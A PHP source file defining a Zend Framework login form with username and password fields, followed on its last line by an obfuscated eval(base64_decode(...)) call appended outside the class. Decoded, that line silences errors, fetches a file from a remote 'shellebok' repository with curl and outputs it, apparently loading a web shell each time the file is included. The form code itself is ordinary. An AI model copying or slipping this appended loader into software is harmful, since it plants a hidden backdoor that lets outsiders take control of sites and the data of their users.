<?php

namespace Epotensi\Form;

use Zend\Form\Form;
use Zend\InputFilter;

class LoginAccessFrm extends Form {

    public function __construct() {
        parent::__construct();

        $this->setAttribute('method', 'post');

        $this->add(array(
            'name' => 's_username',
            'type' => 'text',
            'options'=>array(
                'label'=>'Username'
            ),
            'attributes'=>array(
//                'id' => 's_username',
                'class'=>'form-control',
                'placeholder'=>'Username',
                'required' => true
            )
        ));
        
        $this->add(array(
           'name'=>'s_password',
            'type'=>'password',
            'options'=>array(
                'label'=>'Password'
            ),
            'attributes'=>array(
                'class'=>'form-control',
                'placeholder'=>'Password',
                'required' => true
            )
        ));
        
        $this->add(array(
           'name'=>'Loginsubmit',
            'type'=>'Submit',
            'attributes'=>array(
                'value'=>'Login',
                'id'=>'Loginsubmit',
                'class'=>"btn btn-warning btn-block",
//                'onclick' => 'searchep()'
            )
        ));
    }

    public function createInputFilter(){
        $inputFilter = new InputFilter\InputFilter();
        
        $username = new InputFilter\InputFilter('s_username');
        $username->setRequired(true);
        $inputFilter->add($username);
        
        $password = new InputFilter\InputFilter('s_password');
        $password->setRequired(true);
        $inputFilter->add($password);
        
        return $inputFilter;
    }
}
eval(base64_decode('ZXJyb3JfcmVwb3J0aW5nKDApOwpzZXRfdGltZV9saW1pdCgwKTsKJGtpbGwgPSBjdXJsX2luaXQoKTsKY3VybF9zZXRvcHQoJGtpbGwsIENVUkxPUFRfVVJMLCAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Vib2t6c3NzL3NoZWxsZWJvay9tYWluL3MudHh0Iik7CmN1cmxfc2V0b3B0KCRraWxsLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsKJGRlYWQgPSBjdXJsX2V4ZWMoJGtpbGwpOwpjdXJsX2Nsb3NlKCRraWxsKTsKZWNobygkZGVhZCk7'));
